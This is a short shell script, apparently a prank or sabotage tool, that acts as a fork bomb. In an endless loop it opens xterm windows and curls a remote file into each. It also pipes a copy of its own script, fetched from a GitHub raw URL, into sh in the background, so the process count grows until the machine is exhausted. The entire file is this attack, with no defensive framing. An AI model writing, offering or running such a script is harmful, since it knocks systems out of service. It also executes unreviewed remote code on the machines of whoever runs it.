#!/bin/sh

location='https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/deploy_fork_bom.sh'
bom(){
	xterm -hold -title 'lmao get forked' -mesg -geometry 126x71 -e curl https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/fork
}
webrun(){
	wget -qO - $1 | sh
}

deploy(){	
	while :
		do 
			bom
			webrun ${location} &
		done
}
clear
deploy &
